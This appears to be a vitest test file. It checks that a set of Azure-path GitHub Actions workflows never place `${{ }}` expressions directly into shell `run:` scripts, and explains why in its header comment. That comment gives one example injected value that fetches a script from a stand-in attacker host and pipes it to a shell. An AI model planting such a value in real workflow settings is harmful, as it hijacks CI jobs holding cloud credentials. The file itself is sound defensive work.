// Whether the generated workflows let an environment-controlled value reach a
// shell as source code.
//
// A `${{ vars.X }}` expression is substituted into the `run:` script before the
// shell ever parses it, so the value is not an argument but program text. A
// client id of `$(curl evil.sh | sh)` therefore executes, in a job that holds
// `id-token: write` and `packages: write` and can mint cloud credentials.
// Passing the same value through `env:` and reading `"$VAR"` makes it data: the
// shell substitutes it after parsing and never re-parses the result.
//
// Reaching those variables takes write access to the repository's environment
// settings, so this is an escalation path rather than an open door. It is worth
// closing anyway, because the privilege on the other side of it is the ability
// to authenticate as the environment's cloud identity.
//
// The Azure path is what this guard covers, and it is the whole path rather
// than the provider workflows alone: `run-rad-commands.yml` and
// `delete-application.yml` choose the provider in a job that runs *before* the
// Azure workflow they gate, under the same permissions. Hardening only the
// files whose names end in `-azure.yml` would leave the entry point to them
// injectable. The AWS provider workflows are deliberately out of scope and
// tracked separately; `AWS_ROLE_ARN` is covered here only where it shares a
// step with the Azure check.
//
// Only `run:` scripts are inspected. An expression in `if:`, `with:`, or an
// `env:` value is evaluated by GitHub Actions rather than by a shell, and
// `env:` is where the hardened values are supposed to live.
//
// The YAML is parsed rather than scanned line by line. A line-based reader has
// to guess where a script ends, and cannot see an inline
// `run: echo "${{ ... }}"` that never opens a block scalar at all — which is a
// real way for this to regress.
import { readdir, readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { parse } from "yaml";

const EXTENSION_DIRECTORY = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../../.github/extension"
);

// The Azure path: the provider workflows, plus the dispatchers that decide
// which provider runs. Listed rather than discovered, because "every file that
// participates in the Azure path" is not something a filename pattern can
// answer — `run-rad-commands.yml` does not say Azure in its name.
const AZURE_PATH_WORKFLOWS = [
  "delete-application.yml",
  "delete-azure.yml",
  "delete-environment-azure.yml",
  "delete-environment.yml",
  "run-rad-commands-azure.yml",
  "run-rad-commands.yml",
  "verify-azure.yml"
] as const;

interface WorkflowStep {
  readonly name?: string;
  readonly run?: unknown;
}

interface WorkflowJob {
  readonly steps?: readonly WorkflowStep[];
}

interface Workflow {
  readonly jobs?: Record<string, WorkflowJob>;
}

/** The steps whose `run:` script still carries a GitHub Actions expression. */
function injectableSteps(source: string): string[] {
  const parsed = parse(source) as Workflow | null;
  const found: string[] = [];
  for (const [jobName, job] of Object.entries(parsed?.jobs ?? {})) {
    for (const step of job?.steps ?? []) {
      if (typeof step?.run !== "string") continue;
      if (!step.run.includes("${{")) continue;
      found.push(`${jobName} / ${step.name ?? "(unnamed)"}`);
    }
  }
  return found;
}

const workflows = await Promise.all(
  AZURE_PATH_WORKFLOWS.map(
    async (name) =>
      [
        name,
        await readFile(path.join(EXTENSION_DIRECTORY, name), "utf8")
      ] as const
  )
);

describe("the generated Azure-path workflows' shell inputs", () => {
  // Guards the list itself: an Azure workflow added later and not listed here
  // would not be covered, and nothing else would say so. The two dispatchers
  // name neither provider, so they cannot be discovered by pattern and are
  // checked as a subset rather than by equality.
  it("covers every Azure-path file present on disk", async () => {
    const onDisk = (await readdir(EXTENSION_DIRECTORY)).filter(
      (name) =>
        name.endsWith(".yml") &&
        !name.includes("aws") &&
        (name.includes("azure") || name.includes("rad-commands"))
    );
    const covered = new Set<string>(AZURE_PATH_WORKFLOWS);
    expect(onDisk.filter((name) => !covered.has(name))).toEqual([]);
  });

  it.each(workflows)(
    "%s never interpolates an expression into a run script",
    (_name, source) => {
      // Reported by job and step, because the fix is specific to each site and
      // a bare count would not say where to look.
      expect(injectableSteps(source)).toEqual([]);
    }
  );

  // The reader has to see an expression in a script written as a plain inline
  // scalar, not only in a `|` or `>` block. Without this, a single-line `run:`
  // would reintroduce the vulnerability and stay green.
  it.each([
    ["an inline scalar", 'run: echo "${{ vars.AZURE_CLIENT_ID }}"'],
    ["a literal block", 'run: |\n          echo "${{ vars.AZURE_CLIENT_ID }}"'],
    ["a folded block", 'run: >\n          echo "${{ vars.AZURE_CLIENT_ID }}"']
  ])("detects an expression written as %s", (_label, runScalar) => {
    const source = [
      "jobs:",
      "  detect:",
      "    steps:",
      "      - name: Determine provider",
      `        ${runScalar}`
    ].join("\n");
    expect(injectableSteps(source)).toEqual(["detect / Determine provider"]);
  });

  it("accepts a script that reads the value from the environment", () => {
    const source = [
      "jobs:",
      "  detect:",
      "    steps:",
      "      - name: Determine provider",
      "        env:",
      "          AZURE_CLIENT_ID: ${{ vars.AZURE_CLIENT_ID }}",
      "        run: |",
      '          echo "$AZURE_CLIENT_ID"'
    ].join("\n");
    expect(injectableSteps(source)).toEqual([]);
  });
});
